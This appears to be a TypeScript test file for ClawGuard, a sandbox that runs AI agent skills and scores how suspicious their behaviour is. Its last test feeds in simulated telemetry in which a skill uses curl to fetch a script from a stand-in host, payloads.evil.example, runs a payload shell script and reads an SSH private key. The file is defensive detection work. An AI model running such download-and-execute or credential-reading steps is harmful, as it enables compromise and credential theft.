import assert from "node:assert/strict";
import { test } from "node:test";

import { getSkillFixtureById, listSkillFixtures, loadFixtureSnapshot } from "@clawguard/fixtures";
import type { ContainerRuntimeDetector, DetectedContainerRuntime } from "@clawguard/platform";

import {
  buildDetonationBenchmarkRequest,
  buildLiveDetonationRequest,
  evaluateDetonationReport,
  runDetonationPreflightBenchmark,
  runDetonationPreflightBenchmarkCli,
} from "./index.js";

function createRuntimeDetector(runtime?: DetectedContainerRuntime): ContainerRuntimeDetector {
  return {
    async detectAvailableRuntimes() {
      return runtime ? [runtime] : [];
    },
    async getPreferredRuntime() {
      return runtime;
    },
  };
}

test("buildDetonationBenchmarkRequest is deterministic", () => {
  const fixture = getSkillFixtureById("malicious-staged-download");
  const request = buildDetonationBenchmarkRequest(fixture);

  assert.equal(request.requestId, `bench-${fixture.id}`);
  assert.equal(request.snapshot.slug, fixture.slug);
  assert.equal(request.timeoutSeconds, 90);
  assert.deepEqual(request.prompts, [
    "Initialize the skill and perform any required setup.",
    "Exercise one representative task end-to-end.",
  ]);
});

test("runDetonationPreflightBenchmark consumes every detonation-target fixture", async () => {
  const fixtures = listSkillFixtures({ benchmarkTag: "detonation-target" });
  const runtime = {
    runtime: "podman",
    command: "podman",
  } satisfies DetectedContainerRuntime;

  const summary = await runDetonationPreflightBenchmark({
    runtimeDetector: createRuntimeDetector(runtime),
  });

  assert.equal(summary.fixtureCount, fixtures.length);
  assert.deepEqual(
    summary.rows.map((row) => row.fixtureId),
    fixtures.map((fixture) => fixture.id),
  );
  assert.ok(summary.rows.every((row) => row.runtimeAvailable));
  assert.ok(summary.rows.every((row) => row.runtime === "podman"));
  assert.ok(summary.rows.every((row) => row.status === "ready"));
  assert.ok(summary.rows.every((row) => row.promptCount === 2));
  assert.ok(summary.rows.every((row) => row.timeoutSeconds === 90));
});

test("runDetonationPreflightBenchmarkCli reports runtime-unavailable without failing", async () => {
  const result = await runDetonationPreflightBenchmarkCli(
    {
      CLAWGUARD_BENCH_DETONATION_TIMEOUT_SECONDS: "120",
    },
    createRuntimeDetector(),
  );

  assert.equal(result.exitCode, 0);
  assert.ok(result.summary.rows.every((row) => row.requestId === `bench-${row.fixtureId}`));
  assert.ok(result.summary.rows.every((row) => row.runtime === "unavailable"));
  assert.ok(result.summary.rows.every((row) => row.runtimeAvailable === false));
  assert.ok(result.summary.rows.every((row) => row.status === "runtime-unavailable"));
  assert.ok(result.summary.rows.every((row) => row.timeoutSeconds === 120));
});

test("buildLiveDetonationRequest uses launch defaults for live skill snapshots", () => {
  const fixture = getSkillFixtureById("malicious-staged-download");
  const request = buildLiveDetonationRequest(loadFixtureSnapshot(fixture), {
    requestId: "manual-001",
  });

  assert.equal(request.requestId, "manual-001");
  assert.equal(request.timeoutSeconds, 90);
  assert.equal(request.prompts.length, 5);
});

test("evaluateDetonationReport ignores benign downloads paired only with prompt harness execution", () => {
  const fixture = getSkillFixtureById("malicious-staged-download");
  const evaluated = evaluateDetonationReport({
    request: buildDetonationBenchmarkRequest(fixture),
    summary: "Observed benign activity.",
    findings: [],
    score: 0,
    recommendation: "allow",
    triggeredActions: [],
    artifacts: [],
    telemetry: [
      {
        eventId: "evt-1",
        type: "process",
        detail:
          "Executed /usr/bin/node /workspace/openclaw/.clawguard/prompt-harness.mjs --intent execute-workflow",
        observedAt: "2026-03-19T00:00:00.000Z",
        process: {
          command: "/usr/bin/node",
          args: [
            "node",
            "/workspace/openclaw/.clawguard/prompt-harness.mjs",
            "--intent",
            "execute-workflow",
          ],
          exitCode: 0,
        },
      },
      {
        eventId: "evt-2",
        type: "process",
        detail: "Executed /usr/bin/curl https://api.example.com/weather",
        observedAt: "2026-03-19T00:00:01.000Z",
        process: {
          command: "/usr/bin/curl",
          args: ["curl", "https://api.example.com/weather"],
          exitCode: 0,
        },
      },
    ],
    generatedAt: "2026-03-19T00:00:02.000Z",
  });

  assert.equal(
    evaluated.findings.some((finding) => finding.ruleId === "CG-DET-STAGED-DOWNLOAD-EXECUTE"),
    false,
  );
  assert.equal(evaluated.recommendation, "allow");
});

test("evaluateDetonationReport upgrades verdicts for staged download, honeypot access, and memory mutation", () => {
  const fixture = getSkillFixtureById("malicious-staged-download");
  const evaluated = evaluateDetonationReport({
    request: buildDetonationBenchmarkRequest(fixture),
    summary: "Observed suspicious activity.",
    findings: [],
    score: 0,
    recommendation: "allow",
    triggeredActions: [
      "/usr/bin/curl https://payloads.evil.example/install.sh",
      "/bin/sh /workspace/openclaw/skills/malicious-staged-download/payload.sh",
    ],
    artifacts: [],
    telemetry: [
      {
        eventId: "evt-1",
        type: "process",
        detail: "Executed /usr/bin/curl https://payloads.evil.example/install.sh",
        observedAt: "2026-03-19T00:00:00.000Z",
        process: {
          command: "/usr/bin/curl",
          args: ["curl", "https://payloads.evil.example/install.sh"],
          exitCode: 0,
        },
      },
      {
        eventId: "evt-2",
        type: "process",
        detail: "Executed /bin/sh /workspace/openclaw/skills/malicious-staged-download/payload.sh",
        observedAt: "2026-03-19T00:00:01.000Z",
        process: {
          command: "/bin/sh",
          args: ["/bin/sh", "/workspace/openclaw/skills/malicious-staged-download/payload.sh"],
          exitCode: 0,
        },
      },
      {
        eventId: "evt-3",
        type: "file",
        detail: "write /workspace/openclaw/skills/malicious-staged-download/payload.sh",
        observedAt: "2026-03-19T00:00:01.500Z",
        file: {
          operation: "write",
          path: "/workspace/openclaw/skills/malicious-staged-download/payload.sh",
        },
      },
      {
        eventId: "evt-4",
        type: "file",
        detail: "read /home/clawguard/.ssh/id_rsa",
        observedAt: "2026-03-19T00:00:02.000Z",
        file: {
          operation: "read",
          path: "/home/clawguard/.ssh/id_rsa",
        },
      },
      {
        eventId: "evt-5",
        type: "memory",
        detail: "Memory file changed: memory",
        observedAt: "2026-03-19T00:00:03.000Z",
        memory: {
          name: "memory",
          beforeHash: "sha256:before",
          afterHash: "sha256:after",
        },
      },
    ],
    generatedAt: "2026-03-19T00:00:04.000Z",
  });

  assert.equal(evaluated.recommendation, "block");
  assert.ok(evaluated.score >= 70);
  assert.ok(
    evaluated.findings.some((finding) => finding.ruleId === "CG-DET-STAGED-DOWNLOAD-EXECUTE"),
  );
  assert.ok(evaluated.findings.some((finding) => finding.ruleId === "CG-DET-HONEYPOT-ACCESS"));
  assert.ok(evaluated.findings.some((finding) => finding.ruleId === "CG-DET-MEMORY-MUTATION"));
});
